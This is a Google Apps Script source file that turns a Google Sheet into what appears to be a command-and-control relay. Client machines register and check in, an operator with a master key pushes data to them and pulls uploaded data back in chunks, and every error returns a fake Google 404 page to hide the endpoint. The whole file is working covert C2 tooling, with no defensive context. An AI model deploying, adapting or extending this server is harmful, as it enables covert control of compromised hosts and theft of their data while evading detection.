// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
// Server Variables:
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
const DEBUG = false;
const MASTER_KEY = '';
const SPREADSHEET_URL = '';
// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

const SPREADSHEET = SpreadsheetApp.openByUrl(SPREADSHEET_URL);
const SHEET = SPREADSHEET.getSheets()[0];
const BASE_CHUNK_OFFSET = 5; // column offset to client data chunks
const MAX_CHUNK = 50000; // max Google Sheets cell size
// client states
const STATE = {
  IDLE:     'IDLE',
  DOWNLOAD: 'DOWNLOADING',
  UPLOAD:   'UPLOADING',
};
// client column index to expected data map
const CLIENT = {
  UUID:  0,
  DATE:  1,
  STATE: 2,
  INFO:  3,
  CHUNK: 4,
}
// master remote server commands
const CMD = {
  LIST_CLIENTS:    'lsc',
  GET_CLIENT_DATA: 'get',
  GET_CLIENT_INFO: 'info',
}
// server URL parameters
const URL = {
  CLIENT_UUID: 'u',
  CLIENT_INFO: 'i',
  MASTER_KEY:  'k',
  DATA:        'd',
}

// handles server errors
function error(error) {
  // return google-like error page if not debugging
  if (!DEBUG) {
    var html = '<!DOCTYPE html><html lang=en><meta charset=utf-8><meta name=viewport content="initial-scale=1, minimum-scale=1, width=device-width"><title>Error 404 (Not Found)!!1</title><style>*{margin:0;padding:0}html,code{font:15px/22px arial,sans-serif}html{background:#fff;color:#222;padding:15px}body{margin:7% auto 0;max-width:390px;min-height:180px;padding:30px 0 15px}* > body{background:url(//www.google.com/images/errors/robot.png) 100% 5px no-repeat;padding-right:205px}p{margin:11px 0 22px;overflow:hidden}ins{color:#777;text-decoration:none}a img{border:0}@media screen and (max-width:772px){body{background:none;margin-top:0;max-width:none;padding-right:0}}#logo{background:url(//www.google.com/images/branding/googlelogo/1x/googlelogo_color_150x54dp.png) no-repeat;margin-left:-5px}@media only screen and (min-resolution:192dpi){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat 0% 0%/100% 100%;-moz-border-image:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) 0}}@media only screen and (-webkit-min-device-pixel-ratio:2){#logo{background:url(//www.google.com/images/branding/googlelogo/2x/googlelogo_color_150x54dp.png) no-repeat;-webkit-background-size:100% 100%}}#logo{display:inline-block;height:54px;width:150px}</style><a href=//www.google.com/><span id=logo aria-label=Google></span></a><p><b>404.</b> <ins>That’s an error.</ins><p>The requested URL was not found on this server. <ins>That is all we know.</ins>';
    return HtmlService.createHtmlOutput(html);
  }
  return ContentService.createTextOutput(error);
}

// get a value from a cell in the sheet database
function getCell(uuid, col) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if (data[row][0] === uuid) {
      return (data[row][col] != undefined ? data[row][col] : '');
    }
  }
  return '';
}

// set a value in a cell in the sheet database
function setCell(uuid, col, val) {
  var data = SHEET.getDataRange().getValues();
  for (var row = 0; row < data.length; row++) {
    if (data[row][0] === uuid) {
      // do not set data that is too large
      SHEET.getRange(row + 1, col + 1).setValue(String(val).slice(0, MAX_CHUNK + 1));
    }
  }
}

// set the next chunk for a uuid
function setChunk(uuid, data) {
  // get current chunk to set
  var next_chunk_col = getCell(uuid, CLIENT.CHUNK);
  setCell(uuid, next_chunk_col, data);
  // check for a NULL chunk POST
  if (!data) {
    // update client state
    switch (getCell(uuid, CLIENT.STATE)) {
      case STATE.IDLE:
        // reset chunk column identifiers
        setCell(uuid, CLIENT.CHUNK, BASE_CHUNK_OFFSET);
        // move client to download state
        setCell(uuid, CLIENT.STATE, STATE.DOWNLOAD);
        break;
      case STATE.UPLOAD:
        // reset chunk column identifiers
        setCell(uuid, CLIENT.CHUNK, BASE_CHUNK_OFFSET);
        // move client to idle state
        setCell(uuid, CLIENT.STATE, STATE.IDLE);
        break;
    }
  } else {
    // update current chunk column number to set next
    setCell(uuid, CLIENT.CHUNK, ++next_chunk_col);
  }
}

// get the next chunk for a uuid
function getChunk(uuid) {
  // get current chunk to serve
  var next_chunk_col = getCell(uuid, CLIENT.CHUNK);
  const chunk = getCell(uuid, next_chunk_col);
  // check for a NULL chunk GET
  if (!chunk) {
    // check if all chunks have been downloaded
    switch (getCell(uuid, CLIENT.STATE)) {
      case STATE.DOWNLOAD:
        // reset chunk column identifiers
        setCell(uuid, CLIENT.CHUNK, BASE_CHUNK_OFFSET);
        // move client to uploading state
        setCell(uuid, CLIENT.STATE, STATE.UPLOAD);
        break;
      case STATE.IDLE:
        // reset chunk column identifiers (no state change for IDLE)
        setCell(uuid, CLIENT.CHUNK, BASE_CHUNK_OFFSET);
        break;
    }
  } else {
    // update current chunk column number to serve next
    setCell(uuid, CLIENT.CHUNK, ++next_chunk_col);
  }
  return chunk;
}

// handles server POST requests
function doPost(e) {
  try {
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Master Upload:
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    if (e.parameter.hasOwnProperty(URL.MASTER_KEY)) {
      // validate master key
      if (MASTER_KEY !== e.parameter[URL.MASTER_KEY]) {
        return error('bad master key');
      }
      // post data to a given client
      if (e.parameter.hasOwnProperty(URL.CLIENT_UUID) && e.parameter.hasOwnProperty(URL.DATA)) {
        switch (getCell(e.parameter[URL.CLIENT_UUID], CLIENT.STATE)) {
          case STATE.IDLE:
            setChunk(e.parameter[URL.CLIENT_UUID], e.parameter[URL.DATA]);
          default:
            return ContentService.createTextOutput('');
        }
      }
    }
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Client Upload:
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    else if (e.parameter.hasOwnProperty(URL.CLIENT_UUID)) {
      // post data from a given client
      if (e.parameter.hasOwnProperty(URL.DATA)) {
        switch (getCell(e.parameter[URL.CLIENT_UUID], CLIENT.STATE)) {
          case STATE.UPLOAD:
            setChunk(e.parameter[URL.CLIENT_UUID], e.parameter[URL.DATA]);
          default:
            return ContentService.createTextOutput('');
        }
      }
    }
    return error('bad post request');
  } catch (exception) {
    return error(exception);
  }
}

// handles server GET requests
function doGet(e) {
  try {
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Master Commands:
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    if (e.parameter.hasOwnProperty(URL.MASTER_KEY)) {
      // validate master key
      if (MASTER_KEY !== e.parameter[URL.MASTER_KEY]) {
        return error('bad master key');
      }
      // parse master command
      if (e.parameter.hasOwnProperty(URL.DATA)) {
        switch (e.parameter[URL.DATA]) {
          case CMD.LIST_CLIENTS:
          case CMD.GET_CLIENT_INFO:
            // make list of current clients, check-in dates, and state
            var r = [];
            var data = SHEET.getDataRange().getValues();
            for (var row = 0; row < data.length; row++) {
              r.push(data[row][CLIENT.UUID]);
              r.push(data[row][CLIENT.DATE]);
              r.push(data[row][CLIENT.INFO]);
              r.push(data[row][CLIENT.STATE]);
              // check if we are looking for one client and have found it
              if ((e.parameter[URL.DATA] === CMD.GET_CLIENT_INFO) && (row === e.parameter[URL.CLIENT_UUID])) {
                return ContentService.createTextOutput([
                  data[row][CLIENT.UUID],
                  data[row][CLIENT.DATE],
                  data[row][CLIENT.INFO],
                  data[row][CLIENT.STATE],
                ].join('|'));
              }
            }
            return ContentService.createTextOutput(r.join('|'));
          case CMD.GET_CLIENT_DATA:
            // get next data chunk from target client
            if (e.parameter.hasOwnProperty(URL.CLIENT_UUID)) {
              switch (getCell(e.parameter[URL.CLIENT_UUID], CLIENT.STATE)) {
                case STATE.IDLE:
                  // return next chunk to client if client if there is one
                  return ContentService.createTextOutput(getChunk(e.parameter[URL.CLIENT_UUID]));
                default:
                  // client has not uploaded any data
                  return ContentService.createTextOutput('');
              }
            }
            return error('missing client uuid');
          default:
            return error('invalid master command');
        }
      }
      return error('missing master command');
    }
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Client Check-In:
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    else if (e.parameter.hasOwnProperty(URL.CLIENT_UUID)) {
      // update check-in date
      setCell(e.parameter[URL.CLIENT_UUID], CLIENT.DATE, (new Date()).toLocaleString());
      switch (getCell(e.parameter[URL.CLIENT_UUID], CLIENT.STATE)) {
        case STATE.DOWNLOAD:
          // return next chunk to client if client is done
          return ContentService.createTextOutput(getChunk(e.parameter[URL.CLIENT_UUID]));
        default:
          // no data for client from master yet
          return ContentService.createTextOutput('');
      }
    }
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    // Client Register:
    // ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    else if (e.parameter.hasOwnProperty(URL.CLIENT_INFO)) {
      // try and verify client info consistency
      try {
        const info = Utilities.newBlob(Utilities.base64Decode(e.parameter[URL.CLIENT_INFO])).getDataAsString().split('|');
        if (info.length != 3) {
          throw 'bad info';
        }
      } catch (exception) {
        return error(exception);
      }
      // generates a UUID according to https://www.ietf.org/rfc/rfc4122.txt
      const uuid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
        var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
        return v.toString(16);
      });
      SHEET.appendRow([uuid, (new Date()).toLocaleString(), STATE.IDLE, e.parameter[URL.CLIENT_INFO], BASE_CHUNK_OFFSET]);
      return ContentService.createTextOutput(uuid);
    } else {
      return error('bad request');
    }
  } catch (exception) {
    return error(exception);
  }
}
